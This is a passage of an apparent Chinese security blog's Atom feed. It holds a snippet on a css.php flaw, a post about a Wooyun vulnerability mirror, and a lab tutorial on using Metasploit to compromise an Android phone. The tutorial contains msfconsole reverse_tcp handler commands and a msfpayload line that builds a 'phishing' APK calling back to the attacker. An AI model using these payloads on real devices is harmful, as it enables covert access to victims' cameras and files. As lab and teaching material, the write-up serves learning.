&lt;li&gt;css.php用于压缩css文件，并不只存在于该插件之中，而是 &lt;a href=&quot;https://github.com/mrclay/&quot;&gt;https://github.com/mrclay/&lt;/a&gt; 的开源代码，使用该文件的网站也存在该漏洞。
    
    </summary>
    
    
      <category term="Wordpress安全" scheme="http://blog.neargle.com/tags/Wordpress%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>WooMirror:一个公开漏洞备份及搜索的Wooyun镜像站</title>
    <link href="http://blog.neargle.com/2015/09/14/woomirror-one-spider-and-searchable-wooyun-webapp/"/>
    <id>http://blog.neargle.com/2015/09/14/woomirror-one-spider-and-searchable-wooyun-webapp/</id>
    <published>2015-09-14T05:28:54.000Z</published>
    <updated>2016-07-27T06:43:02.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://ww1.sinaimg.cn/large/005y7Ba5jw1ew1xyripd6j31gp0ixqcp.jpg" alt=""></p>
<h2 id="闲聊">闲聊</h2><p>前一段时间，导师说希望我写一个备份Wooyun公开漏洞信息的爬虫程序，为了避免某些突发情况；写完之后还没爬下来我们去比ISCC，河南的ISCC上网特别麻烦，所以队友君就说“要是有一个离线的漏洞库而且能检索就好了”，于是这事就又到了我头上。考虑到以下三点：</p>
<a id="more"></a>
<ol>
<li>乌云查询必须要会员，对团队里的新人接触漏洞信息确实是个阻碍。</li>
<li>为了避免老师说的某突发情况</li>
<li>为了一个比赛用的离线资料库QwQ</li>
</ol>
<p>于是到处抽出时间一点一点的爬虫和Web端给弄好了，并没有什么技术含量是真的QAQ</p>
<h2 id="功能和所用到技术">功能和所用到技术</h2><ol>
<li>定期更新漏洞信息爬虫：Python_requerst，正则表达式，sqlalchemy，BeautifulSoup</li>
<li>Web端： Flask，sqlalchemy</li>
</ol>
<h2 id="接下来要实现的功能">接下来要实现的功能</h2><ol>
<li>Content的全文搜索功能</li>
<li>Content的前端调整</li>
<li>基于这个的社区功能</li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/large/005y7Ba5jw1ew1xyripd6j31gp0ixqcp.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;闲聊&quot;&gt;闲聊&lt;/h2&gt;&lt;p&gt;前一段时间，导师说希望我写一个备份Wooyun公开漏洞信息的爬虫程序，为了避免某些突发情况；写完之后还没爬下来我们去比ISCC，河南的ISCC上网特别麻烦，所以队友君就说“要是有一个离线的漏洞库而且能检索就好了”，于是这事就又到了我头上。考虑到以下三点：&lt;/p&gt;
    
    </summary>
    
    
      <category term="Web开发" scheme="http://blog.neargle.com/tags/Web%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>使用Metasploit获取Android设备权限</title>
    <link href="http://blog.neargle.com/2015/06/28/android-msf-exploit-by-reverse-tcp/"/>
    <id>http://blog.neargle.com/2015/06/28/android-msf-exploit-by-reverse-tcp/</id>
    <published>2015-06-28T06:14:44.000Z</published>
    <updated>2015-10-23T03:15:46.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="实验环境:">实验环境:</h4><ul>
<li>KALI (IN VMWARE)</li>
<li>Metasploit (IN KALI)</li>
<li>Android 4.1.2</li>
<li>Apache2 (IN KALI)</li>
</ul>
<h4 id="实验步骤:">实验步骤:</h4><a id="more"></a>
<h5 id="步骤1-_打开KALI终端，并在终端打开msfconsole:">步骤1. 打开KALI终端，并在终端打开msfconsole:</h5><p><img src="http://r.loli.io/NzQbie.png" alt="在终端打开msfconsole"></p>
<h5 id="步骤2-_运行以下命令使用android/meterpreter/reverse_tcp的payload，用于监听程序的连接，使用Metasploit_handler:">步骤2. 运行以下命令使用android/meterpreter/reverse_tcp的payload，用于监听程序的连接，使用Metasploit handler:</h5><pre><code><span class="operator"><span class="keyword">use</span> exploit/multi/<span class="keyword">handler</span>
<span class="keyword">set</span> payload android/meterpreter/reverse_tcp</span>
</code></pre><h5 id="步骤3-_运行命令设置lhost和lport，其中lhost我使用了本机的地址，lport我使用了8080作为端口号:">步骤3. 运行命令设置lhost和lport，其中lhost我使用了本机的地址，lport我使用了8080作为端口号:</h5><p><img src="http://ww2.sinaimg.cn/large/005y7Ba5gw1etjtmestpzj30kd0243yp.jpg" alt=""></p>
<h5 id="步骤4-_运行exploit开始监听">步骤4. 运行exploit开始监听</h5><p><img src="http://ww2.sinaimg.cn/large/005y7Ba5gw1etjtnvlzl6j30kb04n0th.jpg" alt=""></p>
<h5 id="步骤5-_制作钓鱼APK，使用KALI终端运行以下命令，该命令会在桌面生成一个DropsMsf-apk文件">步骤5. 制作钓鱼APK，使用KALI终端运行以下命令，该命令会在桌面生成一个DropsMsf.apk文件</h5><pre><code>msfpayload android/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.199</span><span class="number">.207</span> LPORT=<span class="number">8080</span> R &gt; /root/Desktop/DropsMsf.apk 
</code></pre><p><img src="http://ww4.sinaimg.cn/large/005y7Ba5gw1etjtq6jrz0j30ld01jdfz.jpg" alt=""></p>
<h5 id="步骤6-_运行Apache并搭建简易Web服务器提供apk下载(不是本次实验主要内容简单过)">步骤6. 运行Apache并搭建简易Web服务器提供apk下载(不是本次实验主要内容简单过)</h5><p><img src="http://r.loli.io/AvEjea.png" alt=""></p>
<h5 id="步骤7-_使用手机下载apk并安装">步骤7. 使用手机下载apk并安装</h5><p><img src="http://ww4.sinaimg.cn/large/005y7Ba5jw1ev9aqspismj30de07ydgg.jpg" alt=""><br><img src="http://ww4.sinaimg.cn/large/005y7Ba5gw1etju51ea9aj30dc0nqacb.jpg" alt=""></p>
<h4 id="实验结果">实验结果</h4><ul>
<li>可获取Android手机的摄像头权限拍摄照片</li>
<li>可下载Android手机的任意文件</li>
<li>等等</li>
</ul>
<p>####实验结果展示</p>
<p><img src="http://r.loli.io/2uYZzq.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;实验环境:&quot;&gt;实验环境:&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;KALI (IN VMWARE)&lt;/li&gt;
&lt;li&gt;Metasploit (IN KALI)&lt;/li&gt;
&lt;li&gt;Android 4.1.2&lt;/li&gt;
&lt;li&gt;Apache2 (IN KALI)&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&quot;实验步骤:&quot;&gt;实验步骤:&lt;/h4&gt;
    
    </summary>
    
    
      <category term="Metasploit" scheme="http://blog.neargle.com/tags/Metasploit/"/>
    
  </entry>
  
</feed>
